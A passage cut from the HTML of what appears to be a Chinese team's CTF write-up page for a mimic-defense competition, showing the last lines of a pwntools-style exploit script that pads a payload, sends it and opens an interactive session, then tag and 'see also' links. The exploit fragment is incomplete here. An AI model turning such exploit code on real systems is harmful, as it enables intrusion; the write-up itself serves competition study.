+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x200</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>itr</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><div class=blog-tags><a href=https://su-team.cn/tags/%E6%8B%9F%E6%80%81/>拟态</a>&nbsp;</div><h4 class=see-also>See also</h4><ul><li><a href=/post/ntfy-2022-su-wu/>第五届“强网”拟态防御国际精英挑战赛 SU Writeup</a></li><li><a href=/post/ntfy-2021-su-wu/>第四届“强网”拟态防御国际精英挑战赛 SU Write-Up</a></li></ul>
